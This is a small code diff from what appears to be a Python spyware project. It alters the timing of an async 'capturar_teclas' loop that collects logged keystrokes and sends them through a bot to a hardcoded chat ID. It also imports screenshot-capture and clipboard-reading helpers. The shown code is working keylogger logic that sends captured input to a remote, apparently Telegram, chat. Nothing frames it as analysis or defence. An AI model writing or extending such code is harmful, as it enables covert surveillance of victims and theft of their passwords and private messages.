@@ -6,7 +6,7 @@ from funciones import registro_errores, capture_screenshot, get_clipboard_conten
 async def capturar_teclas(bot):
     global llista_teclas
     while True:
-        await asyncio.sleep(1)
+        await asyncio.sleep(5)
         if llista_teclas:
             try:
                 await bot.send_message(chat_id="654850399", text="\n".join(llista_teclas))
